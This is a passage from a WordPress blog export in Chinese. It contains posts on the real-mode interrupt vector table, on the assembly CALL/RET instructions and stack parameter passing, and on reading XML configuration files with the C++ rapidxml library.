            <td width="20"><font color="#0000ff">114H</font></td>
            <td width="20" align="center"><font color="#000000">45H</font></td>
            <td width="20"><font color="#000080">69</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">118H</font></td>
            <td width="20" align="center"><font color="#000000">46H</font></td>
            <td width="20"><font color="#000080">70</font></td>
            <td width="200">指向硬盘1的参数表,BIOS使这个向量指向 ROM驻留的表。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">11CH</font></td>
            <td width="20" align="center"><font color="#000000">47H</font></td>
            <td width="20"><font color="#000080">71</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">120H</font></td>
            <td width="20" align="center"><font color="#000000">48H</font></td>
            <td width="20"><font color="#000080">72</font></td>
            <td width="200">PC机使用，用于把PC机的键盘代码变换为标准的键盘代码。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">124H</font></td>
            <td width="20" align="center"><font color="#000000">49H</font></td>
            <td width="20"><font color="#000080">73</font></td>
            <td width="200">指向键盘增强服务变换表</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">128-17FH</font></td>
            <td width="20" align="center"><font color="#000000">4A-5FH</font></td>
            <td width="20"><font color="#000080">74-95</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">180-19FH</font></td>
            <td width="20" align="center"><font color="#000000">60-67H</font></td>
            <td width="20"><font color="#000080">96-103</font></td>
            <td width="200">为用户程序保留的单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1A0-1BFH</font></td>
            <td width="20" align="center"><font color="#000000">68-6FH</font></td>
            <td width="20"><font color="#000080">104-111</font></td>
            <td width="200">未使用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1C0H</font></td>
            <td width="20" align="center"><font color="#000000">70H</font></td>
            <td width="20"><font color="#000080">112</font></td>
            <td width="200">硬件中断（IRQ--interrupt request） 8--实时时钟中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1C4H</font></td>
            <td width="20" align="center"><font color="#000000">71H</font></td>
            <td width="20"><font color="#000080">113</font></td>
            <td width="200">硬件中断9</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1C8H</font></td>
            <td width="20" align="center"><font color="#000000">72H</font></td>
            <td width="20"><font color="#000080">114</font></td>
            <td width="200">硬件中断10</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1CCH</font></td>
            <td width="20" align="center"><font color="#000000">73H</font></td>
            <td width="20"><font color="#000080">115</font></td>
            <td width="200">硬件中断11</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1D0H</font></td>
            <td width="20" align="center"><font color="#000000">74H</font></td>
            <td width="20"><font color="#000080">116</font></td>
            <td width="200">硬件中断12</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1D4H</font></td>
            <td width="20" align="center"><font color="#000000">75H</font></td>
            <td width="20"><font color="#000080">117</font></td>
            <td width="200">硬件中断13--BIOS把这个中断向量重定向为非屏蔽中断（NMI）</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1D8H</font></td>
            <td width="20" align="center"><font color="#000000">76H</font></td>
            <td width="20"><font color="#000080">118</font></td>
            <td width="200">硬件中断14</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1DCH</font></td>
            <td width="20" align="center"><font color="#000000">77H</font></td>
            <td width="20"><font color="#000080">119</font></td>
            <td width="200">硬件中断15</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">1E0-1FFH</font></td>
            <td width="20" align="center"><font color="#000000">78-7FH</font></td>
            <td width="20"><font color="#000080">120-127</font></td>
            <td width="200">未使用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">200-217H</font></td>
            <td width="20" align="center"><font color="#000000">80-85H</font></td>
            <td width="20"><font color="#000080">128-133</font></td>
            <td width="200">为BASIC保留</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">218-3C3H</font></td>
            <td width="20" align="center"><font color="#000000">86-F0H</font></td>
            <td width="20"><font color="#000080">134-240</font></td>
            <td width="200">BASIC程序运行时提供给BASIC解释程序作用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">3C4-#FFH</font></td>
            <td width="20" align="center"><font color="#000000">F1-FFH</font></td>
            <td width="20"><font color="#000080">241-255</font></td>
            <td width="200">未作用</td>
        </tr>
    </tbody>
</table>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>100</wp:post_id>
		<wp:post_date>2011-09-20 17:34:41</wp:post_date>
		<wp:post_date_gmt>2011-09-20 09:34:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%b8%ad%e6%96%ad%e5%90%91%e9%87%8f%e8%a1%a8</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[17]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359062]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>参数传递</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94call%e5%92%8cret%e6%8c%87%e4%bb%a4/%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92/</link>
		<pubDate>Mon, 26 Sep 2011 12:52:42 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/03/0B/wKgKDE6AdZoAAAAAAAAMJi27TXE759.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>105</wp:post_id>
		<wp:post_date>2011-09-26 20:52:42</wp:post_date>
		<wp:post_date_gmt>2011-09-26 12:52:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>102</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/03/0B/wKgKDE6AdZoAAAAAAAAMJi27TXE759.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"499";s:6:"height";s:3:"207";s:14:"hwstring_small";s:23:"height='53' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/01/DC/wKgKCk6AdZoAAAAAAAAT1mQKWA4120.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"77";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/51/wKgKCk6AdZoAAAAAAAAh5WU-qL4862.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"204";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/51/wKgKCk6AdZoAAAAAAACxEgz-KYE585.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/5B/wKgKC06AdZoAAAAAAAAMJiTQ2eY797.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——CALL和RET指令</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94call%e5%92%8cret%e6%8c%87%e4%bb%a4/</link>
		<pubDate>Mon, 26 Sep 2011 13:01:08 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=102</guid>
		<description></description>
		<content:encoded><![CDATA[底层编程有益于程序员的灵魂—— 约翰·卡马克（John Carmack）

call 和 ret 指令都是转移指令，它们都修改IP 或 同时修改CS 和 IP。它们经常被共同用来实现子程序的设计。

<strong>call 指令</strong>：CPU 执行 call 指令时，进行两步操作：
<ol>
	<li>将当前的 IP 或 CS 和 IP 压入栈中；</li>
	<li>转移。</li>
</ol>
call 指令不能实现短转移，除此之外，call 指令实现转移的方法和 jmp 指令的原理相同。有四种格式：
（1）根据位移转移的 call 指令。指令格式：call 标号，功能相当于：
<ul>
	<li>push IP</li>
	<li>jmp near ptr 标号</li>
</ul>
16位位移 = 标号处地址 - call 指令后的第一个字节的地址，位移范围-32768~32767，补码表示；
16位位移由编译程序在编译时算出。

（2）转移的目的地址在指令中的 call 指令。格式：call far ptr 标号，功能相当于：
<ul>
	<li>push CS</li>
	<li>push IP</li>
	<li>jmp far ptr 标号</li>
</ul>
CS：标号所在段的段地址，IP：标号所在段中的偏移地址
"call far ptr 标号"实现的是段间转移。

（3）转移地址在寄存器中的 call 指令。格式：call 16 位reg，功能相当于：
<ul>
	<li>push IP</li>
	<li>jmp 16位 reg</li>
</ul>
（4）转移地址在内存中的 call 指令。格式：call word ptr 内存单元地址；call dword ptr 内存单元地址。功能分别为：
<ul>
	<li>push IP</li>
	<li>jmp word ptr 内存单元地址</li>
</ul>
和
<ul>
	<li>push CS</li>
	<li>push IP</li>
	<li>jmp dword ptr 内存单元地址</li>
</ul>
<strong>用栈传递参数</strong>：用栈传递参数原理十分简单，就是调用者将需要传递给子程序的参数压入栈中，子程序从栈中取得参数。
以下是一段C及对应汇编程序：
<pre class="c">void add(int, int, int);
</br>
main()
{
    int a = 1;
    int b = 2;
    int c = 0;
    add(a, b, c);
}
</br>
void add(int a, int b, int c)
{
    c = a + b;
}</pre>
汇编代码：
<pre class="asm">    mov bp, sp
    sub sp, 6
    mov word ptr [bp-6], 0001 ;int a
    mov word ptr [bp-4], 0002 ;int b
    mov word ptr [bp-4], 0000 ;int c
    push [bp-2]
    push [bp-4]
    push [bp-6]
    call ADDR
    add sp, 6
    inc word ptr [bp-2]

ADDR:
    push bp
    mov bp, sp
    mov ax, [bp+4]
    add ax, [bp+6]
    mov [bp+8], ax
    mov sp, bp
    pop bp
    ret</pre>
栈示意图，时序：上→下、右→左→右：
<img src="http://files.blogcn.com/wp06/M00/03/0B/wKgKDE6AdZoAAAAAAAAMJi27TXE759.png" alt="参数压栈" />
C语言中，局部变量在栈中存储， sub sp, 6 即为局部变量开辟空间。调用ADDR子程序时，先后将ip、bp压栈，这里bp的为main函数中bp的值，ip的值为add sp, 6的地址。

因为采用的值传递，可见未真正修改c的值，而只是修改它的副本（调用子程序参数入栈的时候生成），且最后sp指向了正确的栈顶。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>102</wp:post_id>
		<wp:post_date>2011-09-26 21:01:08</wp:post_date>
		<wp:post_date_gmt>2011-09-26 13:01:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94call%e5%92%8cret%e6%8c%87%e4%bb%a4</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[18]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359053]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[%e6%b1%87%e7%bc%96%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94call%e5%92%8cret%e6%8c%87%e4%bb%a4]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>rapidxmltest</title>
		<link>http://codemylife.blogcn.com/2011/10/%e4%bd%bf%e7%94%a8rapidxml%e8%af%bb%e5%8f%96%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6/rapidxmltest/</link>
		<pubDate>Sun, 02 Oct 2011 05:31:38 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/01/38/wKgKDU6H9zoAAAAAAAAnFCGbpjw920.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>109</wp:post_id>
		<wp:post_date>2011-10-02 13:31:38</wp:post_date>
		<wp:post_date_gmt>2011-10-02 05:31:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rapidxmltest</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>108</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/01/38/wKgKDU6H9zoAAAAAAAAnFCGbpjw920.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"665";s:6:"height";s:3:"307";s:14:"hwstring_small";s:23:"height='59' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/75/wKgKC06H9zsAAAAAAAANIibUgxw183.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"86";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/2E/wKgKDE6H9zsAAAAAAAAjE1TZoEw261.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"228";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/EC/wKgKC06H9zsAAAAAAAChY3g2Pr8280.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/2C/wKgKDE6H9zsAAAAAAAAnFHY_9Ow474.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>rapidxmltest2</title>
		<link>http://codemylife.blogcn.com/2011/10/%e4%bd%bf%e7%94%a8rapidxml%e8%af%bb%e5%8f%96%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6/rapidxmltest2/</link>
		<pubDate>Sun, 02 Oct 2011 05:40:25 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/02/75/wKgKC06H-UkAAAAAAAAP4nksJMI402.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>110</wp:post_id>
		<wp:post_date>2011-10-02 13:40:25</wp:post_date>
		<wp:post_date_gmt>2011-10-02 05:40:25</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>rapidxmltest2</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>108</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/02/75/wKgKC06H-UkAAAAAAAAP4nksJMI402.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"665";s:6:"height";s:3:"168";s:14:"hwstring_small";s:23:"height='32' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/EC/wKgKC06H-UkAAAAAAAAMHmkC1bI630.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"47";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/2C/wKgKDE6H-UkAAAAAAAAS2UD4DwA346.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"124";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/01/DF/wKgKC06H-UkAAAAAAABPAAh3J1o035.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/6B/wKgKCk6H-UkAAAAAAAAP4lZCHRg210.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>使用rapidxml读取配置文件</title>
		<link>http://codemylife.blogcn.com/2011/10/%e4%bd%bf%e7%94%a8rapidxml%e8%af%bb%e5%8f%96%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6/</link>
		<pubDate>Sun, 02 Oct 2011 06:01:38 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[技术]]></category>

		<category domain="category" nicename="%e6%8a%80%e6%9c%af"><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=108</guid>
		<description></description>
		<content:encoded><![CDATA[学习贵在持之以恒。

自己所在的项目组中，读取 xml 配置文件使用的是 tinyxml，所以对 tinyxml 用法熟些。当为自己的代码选择 xml 解析库时，搜索得知 rapidxml 是一个不错的选择，小巧，快速，作者还和 strlen 作过对比：
<table border="1" cellpadding="3pt">
<tbody>
<tr>
<th> Platform</th>
<th> Compiler</th>
<th> strlen()</th>
<th> RapidXml</th>
<th> pugixml 0.3</th>
<th> pugxml</th>
<th> TinyXml</th>
</tr>
<tr>
<td>Pentium 4</td>
<td>MSVC 8.0</td>
<td>2.5</td>
<td>5.4</td>
<td>7.0</td>
<td>61.7</td>
<td>298.8</td>
</tr>
<tr>
<td>Pentium 4</td>
<td>gcc 4.1.1</td>
<td>0.8</td>
<td>6.1</td>
<td>9.5</td>
<td>67.0</td>
<td>413.2</td>
</tr>
<tr>
<td>Core 2</td>
<td>MSVC 8.0</td>
<td>1.0</td>
<td>4.5</td>
<td>5.0</td>
<td>24.6</td>
<td>154.8</td>
</tr>
<tr>
<td>Core 2</td>
<td>gcc 4.1.1</td>
<td>0.6</td>
<td>4.6</td>
<td>5.4</td>
<td>28.3</td>
<td>229.3</td>
</tr>
<tr>
<td>Athlon XP</td>
<td>MSVC 8.0</td>
<td>3.1</td>
<td>7.7</td>
<td>8.0</td>
<td>25.5</td>
<td>182.6</td>
</tr>
<tr>
<td>Athlon XP</td>
<td>gcc 4.1.1</td>
<td>0.9</td>
<td>8.2</td>
<td>9.2</td>
<td>33.7</td>
<td>265.2</td>
</tr>
<tr>
<td>Pentium 3</td>
<td>MSVC 8.0</td>
<td>2.0</td>
<td>6.3</td>
<td>7.0</td>
<td>30.9</td>
<td>211.9</td>
</tr>
<tr>
<td>Pentium 3</td>
<td>gcc 4.1.1</td>
<td>1.0</td>
<td>6.7</td>
<td>8.9</td>
<td>35.3</td>
<td>316.0</td>
</tr>
</tbody>
</table>
可见确实不错。关于如何保持这么高的效率，RAPIDXML Manual中提到：
<ul>
	<li><span style="color: #ff0000;">In-situ parsing</span>. When building DOM tree, RapidXml does not make copies of string data, such as node names and values. Instead, it<span style="color: #ff0000;"> <span style="color: #ff0000;">stores pointer</span></span><span style="color: #ff0000;">s</span> to interior of the source text.</li>
	<li>Use of <span style="color: #ff0000;">template metaprogramming techniques</span>. This allows it to move much of the work to compile time. Through magic of the templates, C++ compiler generates a separate copy of parsing code for any combination of parser flags you use. In each copy, all possible decisions are made at compile time and all unused code is omitted.</li>
	<li>Extensive use of <span style="color: #ff0000;">lookup tables</span> for parsing.</li>
	<li>Hand-tuned C++ with <span style="color: #ff0000;">profiling</span> done on several most popular CPUs.</li>
</ul>
包含文件：
rapidxml.hpp：实现内存池 解析string 异常处理，包含：
<ul>
	<li>xml_base 基数节点类</li>
	<li>xml_attribute 文本类</li>
	<li>xml_node 节点类</li>
	<li>xml_document 文档类</li>
</ul>
rapidxml_iterators.hpp：提供两个迭代器类：node_iterator， attribute_iterator
rapidxml_print.hpp：提供跟字符串，流对象的装换函数
rapidxml_utils.hpp：提供一个file用来读取文件使用，跟两个计数函数 count_children，count_attributes

随便写个文件测试一下，xml 文件：

[xml]
&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;
&lt;!--test--&gt;
&lt;TestUnit&gt;
	&lt;PointPos&gt;
		&lt;pos xy=&quot;100,200&quot; xz=&quot;200,300&quot;/&gt;
		&lt;name name=&quot;三角形上的点&quot;/&gt;
	&lt;/PointPos&gt;
	&lt;item strName=&quot;hello world!&quot;/&gt;
&lt;/TestUnit&gt;
[/xml]

代码：

[c]
#include &lt;iostream&gt;
#include &quot;rapidxml.hpp&quot;
#include &quot;rapidxml_print.hpp&quot;
using namespace std;
using namespace rapidxml;
int main()
{
    FILE* fp = fopen(&quot;test.xml&quot;, &quot;r&quot;);
    if (! fp)
        return 1;
    //获取文件长度
    fseek(fp, 0, SEEK_END);
    size_t len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    //读取文件
    char* pBuf = new char[len+1];
    if (! pBuf)
        return 1;
    memset(pBuf, 0, len+1);
    fread(pBuf, len, 1, fp);
    fclose(fp);
    //开始解析
    xml_document&lt;&gt; doc;
    doc.parse&lt;0&gt;(pBuf);
    std::cout &lt;&lt; doc;
    cout &lt;&lt; &quot;first node is: &quot; &lt;&lt; doc.first_node()-&gt;name() &lt;&lt; &quot;\n&quot;;
    xml_node&lt;&gt;* node = doc.first_node(&quot;TestUnit&quot;);	//根节点
    if (node) {
        //TestUnit节点
	xml_node&lt;&gt;* PointPos = node-&gt;first_node(&quot;PointPos&quot;);
	cout &lt;&lt; PointPos-&gt;name() &lt;&lt; &quot;\n&quot;;
	if (PointPos) {
	    xml_node&lt;&gt;* pPos = PointPos-&gt;first_node(&quot;pos&quot;);
	    if (pPos) {
	        xml_attribute&lt;&gt;* pxy = pPos-&gt;first_attribute(&quot;xy&quot;);
		cout &lt;&lt; pxy-&gt;name() &lt;&lt; &quot;:&quot; &lt;&lt; pxy-&gt;value() &lt;&lt;&quot;\n&quot;;
		xml_attribute&lt;&gt;* pxz = pPos-&gt;first_attribute(&quot;xz&quot;);
		cout &lt;&lt; pxz-&gt;name() &lt;&lt; &quot;:&quot; &lt;&lt; pxz-&gt;value() &lt;&lt;&quot;\n&quot;;
	    }
	    xml_node&lt;&gt;* name = PointPos-&gt;first_node(&quot;name&quot;);
	    if (name) {
		xml_attribute&lt;&gt;* pName = name-&gt;first_attribute(&quot;name&quot;);
		cout &lt;&lt; pName-&gt;name() &lt;&lt; &quot;:&quot; &lt;&lt; pName-&gt;value() &lt;&lt; &quot;\n&quot;;
	    }
	}
	//item节点
	xml_node&lt;&gt;* helloworld = node-&gt;first_node(&quot;item&quot;);
	cout &lt;&lt; helloworld-&gt;name() &lt;&lt; &quot;\n&quot;;
	xml_attribute&lt;&gt;* phelloStr = helloworld-&gt;first_attribute(&quot;strName&quot;);
	cout &lt;&lt; phelloStr-&gt;name() &lt;&lt; &quot;:&quot; &lt;&lt; phelloStr-&gt;value() &lt;&lt; &quot;\n&quot;;
    }
    delete [] pBuf;
    return 0;
}
[/c]

运行结果：
<img src="http://files.blogcn.com/wp06/M00/01/38/wKgKDU6H9zoAAAAAAAAnFCGbpjw920.png" alt="rapidxml" />
<span style="color: #ff0000;"> 注意：</span>代码24行传递默认解析参数0，当解析完毕后，pBuf里面的文本已经被改变了！添加如下代码将其打印出来：

[c]
for (size_t i = 0; i &lt; len; i++) {
    char ch = *(pBuf + i);
    cout &lt;&lt; ch;
}
[/c]

结果是：
<img src="http://files.blogcn.com/wp01/M00/02/75/wKgKC06H-UkAAAAAAAAP4nksJMI402.png" alt="rapidxml2" />
这就不难看出，rapidxml 的 In-situ parsing 的含义了！这一点，Manual说得很清楚，择录如下：
3.3 Destructive Vs Non-Destructive Mode

By default, the parser <span style="color: #ff0000;">modifies</span> source text during the parsing process. This is required to achieve character entity translation, whitespace normalization, and zero-termination of strings.

In some cases this behaviour may be undesirable, for example if source text resides in read only memory, or is mapped to memory directly from file. By using appropriate parser flags (parse_non_destructive), source text modifications can be disabled. However, because RapidXml does in-situ parsing, it obviously has the following side-effects:
<ul>
	<li>no whitespace normalization is done</li>
	<li>no entity reference translation is done</li>
	<li>names and values are not zero-terminated, you must use xml_base::name_size() and xml_base::value_size() functions to tell where they end</li>
</ul>
我们可以将解析代码替换为：doc.parse&lt;parse_non_destructive&gt;(pBuf)，这样就可以不改变source text，只不过这时候，你得调用name_size() 或 value_size() 来决定你想要获取的字符串的长度，因为 <strong>rapidxml 仅仅是保存指针而已</strong>。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>108</wp:post_id>
		<wp:post_date>2011-10-02 14:01:38</wp:post_date>
		<wp:post_date_gmt>2011-10-02 06:01:38</wp:post_date_gmt>
